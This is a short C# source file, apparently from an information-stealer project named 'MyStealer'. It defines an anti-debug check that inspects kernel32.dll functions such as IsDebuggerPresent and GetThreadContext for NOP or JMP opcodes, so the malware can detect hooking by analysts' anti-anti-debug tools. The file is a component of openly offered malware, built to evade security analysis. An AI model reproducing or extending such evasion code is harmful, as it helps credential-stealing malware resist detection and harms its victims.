using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace MyStealer.AntiDebug.Check.AntiAntiAntiDebug
{
    internal class Kernel32Check : HookCheckBase
    {
        public override string Name => "Hooking: kernel32";

        protected override string ModuleName => "kernel32.dll";

        protected override string[] ProcNames => new string[]
        {
            "IsDebuggerPresent",
            "CheckRemoteDebuggerPresent",
            "GetThreadContext",
            "CloseHandle",
            "OutputDebugStringA",
            "OutputDebugStringW",
            "GetTickCount",
            "SetHandleInformation"
        };

        protected override byte[] BadOpCodes => new byte[] { 0x90, 0xE9 };
    }
}
